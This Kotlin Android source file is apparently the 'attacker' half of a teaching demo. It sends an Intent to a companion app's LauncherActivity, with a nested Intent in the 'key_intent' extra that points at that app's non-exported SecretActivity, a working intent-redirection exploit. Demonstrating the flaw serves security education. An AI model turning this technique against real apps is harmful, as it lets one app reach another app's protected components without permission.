package ir.fallahpoor.attackerapp

import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    companion object {
        const val VULNERABLE_APP_PACKAGE_NAME = "ir.fallahpoor.intentredirectionvulnerability"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        findViewById<Button>(R.id.sendIntentButton).setOnClickListener {
            startActivity(createIntent())
        }
    }

    private fun createIntent(): Intent {
        val intentExtra = Intent().apply {
            val vulnerableAppInaccessibleClassName = "$VULNERABLE_APP_PACKAGE_NAME.SecretActivity"
            setComponent(
                ComponentName(
                    VULNERABLE_APP_PACKAGE_NAME,
                    vulnerableAppInaccessibleClassName
                )
            )
        }
        val vulnerableAppClassName = "$VULNERABLE_APP_PACKAGE_NAME.LauncherActivity"
        val intent = Intent().apply {
            setComponent(ComponentName(VULNERABLE_APP_PACKAGE_NAME, vulnerableAppClassName))
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            putExtra("key_intent", intentExtra)
        }
        return intent
    }
}